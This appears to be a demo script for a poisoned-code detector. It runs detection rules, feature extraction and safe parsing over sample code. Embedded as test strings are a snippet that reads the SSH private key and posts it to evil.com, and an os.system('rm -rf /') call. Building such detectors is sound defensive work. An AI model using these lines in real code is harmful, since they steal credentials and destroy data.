"""Quick demo of PoisonCode Detector functionality."""

import sys
from pathlib import Path

print("=" * 70)
print("PoisonCode Detector - Quick Demo")
print("=" * 70)

# Test 1: Rule Engine
print("\n1. Testing Rule Engine...")
print("-" * 70)

from pcd.rules import RuleEngine
from pcd.scanner import scan_file

# Scan a backdoor sample
backdoor_file = 'samples/poisoned/poisoned_backdoor_auth.py'
scan_result = scan_file(backdoor_file)
engine = RuleEngine()

if scan_result.units:
    matches = engine.check_code(scan_result.units[0].code, 1)
    print(f"File: {backdoor_file}")
    print(f"Found {len(matches)} rule matches:")
    for match in matches[:3]:
        print(f"  • {match.rule_id} [{match.severity}]: {match.why}")
        print(f"    Line {match.line}: {match.snippet[:60]}...")
    print("✓ Rule engine working correctly")
else:
    print("✗ Failed to scan file")

# Test 2: Feature Extraction
print("\n2. Testing Feature Extraction...")
print("-" * 70)

from pcd.features import extract_features

code_sample = """
import os
import requests

def exfiltrate_data():
    key = open(os.path.expanduser('~/.ssh/id_rsa')).read()
    requests.post('http://evil.com', data=key)
"""

features = extract_features(code_sample)
print(f"Extracted {len(features)} features")
print("Key dangerous features detected:")
print(f"  • requests_post_count: {features.get('requests_post_count', 0)}")
print(f"  • ssh_access: {features.get('ssh_access', 0)}")
print(f"  • exfil_pair: {features.get('exfil_pair', 0)}")
print("✓ Feature extraction working")

# Test 3: Safe Parsing
print("\n3. Testing Safe Parsing (Non-Execution)...")
print("-" * 70)

from pcd.parsing import safe_parse

dangerous_code = """
import os
os.system("echo THIS_SHOULD_NEVER_PRINT")
exec("print('THIS_ALSO_SHOULD_NOT_PRINT')")

def dangerous():
    os.system("rm -rf /")  # This is parsed but never executed
"""

parse_result = safe_parse(dangerous_code)
print(f"Code parsed: {parse_result.parse_ok}")
print(f"AST nodes found: {parse_result.tree is not None}")
print("✓ Code was safely parsed WITHOUT execution")
print("  (If you saw any output above, that would be a bug!)")

# Test 4: Dataset Info
print("\n4. Checking Dataset...")
print("-" * 70)

dataset_path = Path('data/processed/dataset.csv')
if dataset_path.exists():
    import pandas as pd
    df = pd.read_csv(dataset_path)
    print(f"Dataset found: {dataset_path}")
    print(f"Total samples: {len(df)}")
    print(f"Benign: {(df['label'] == 0).sum()}")
    print(f"Malicious: {(df['label'] == 1).sum()}")
    print(f"Hard negatives: {(df['is_hard_negative'] == 1).sum()}")
    print("\nFamily distribution:")
    print(df[df['label'] == 1]['family'].value_counts())
    print("✓ Dataset ready for training")
else:
    print(f"Dataset not found at {dataset_path}")
    print("Run: pcd generate-data --out data/processed --seed 42")

# Test 5: Model Status
print("\n5. Checking Model...")
print("-" * 70)

model_path = Path('models/pcd_model.joblib')
if model_path.exists():
    print(f"✓ Model found at {model_path}")
    print("  Ready to scan files!")
    
    # Try a quick scan
    from pcd.model import PCDModel
    model = PCDModel.load(str(model_path))
    
    test_code = "def add(a, b): return a + b"
    score, verdict = model.predict(test_code)
    print(f"\nQuick test: Simple function")
    print(f"  Score: {score:.3f}")
    print(f"  Verdict: {verdict}")
    
else:
    print(f"Model not found at {model_path}")
    print("To create the model:")
    print("  1. pcd generate-data --out data/processed --seed 42")
    print("  2. pcd train --data data/processed --out models/")

# Summary
print("\n" + "=" * 70)
print("Demo Complete!")
print("=" * 70)

print("\nWhat works:")
print("  ✓ Rule engine (25+ detection rules)")
print("  ✓ Feature extraction (~60 features)")
print("  ✓ Safe parsing (never executes code)")
if dataset_path.exists():
    print("  ✓ Dataset generated")
if model_path.exists():
    print("  ✓ Model trained")

print("\nNext steps:")
if not dataset_path.exists():
    print("  1. Generate dataset: pcd generate-data --out data/processed --seed 42")
if not model_path.exists():
    print("  2. Train model: pcd train --data data/processed --out models/")
print("  3. Scan samples: pcd scan samples/")
print("  4. Test build gate: pcd build --target samples/poisoned -- echo TEST")

print("\nFor full documentation, see README.md")
print("=" * 70)
